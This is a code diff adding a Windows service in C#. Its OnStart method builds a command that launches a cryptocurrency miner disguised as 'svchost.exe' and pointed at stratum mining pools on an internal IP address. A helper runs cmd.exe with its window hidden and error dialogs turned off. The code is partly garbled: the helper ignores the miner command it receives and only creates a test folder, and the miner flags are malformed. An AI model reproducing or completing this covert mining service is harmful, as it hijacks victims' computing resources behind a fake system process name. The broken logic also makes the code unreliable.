@@ -1,0 +1,29 @@
+        protected override void OnStart(string[] args)
+        {
+            String Command = "/K svchost.exe - B--donate - level = 1 - o stratum + tcp://10.141.5.254:8014 -u 253 -p 253 -o stratum+tcp://10.141.5.254:3128 -o stratum+tcp://10.141.5.254:2967 -k";
+
+            ExecuteCommand(Command);
+
+        }
+
+        public void ExecuteCommand(String command)
+        {
+          //  System.Diagnostics.ProcessStartInfo processBat = new System.Diagnostics.ProcessStartInfo(@"batch.bat");
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            ProcessStartInfo psi = new ProcessStartInfo
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                FileName = "cmd.exe",
+                Arguments = "/C cd C:\\ProgramData\\ipmesg & mkdir test123",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                ErrorDialog = false
+            };
+
+            proc.StartInfo = psi;
+            proc.Start();
+            proc.WaitForExit();
+          //  p.Start();
+        }
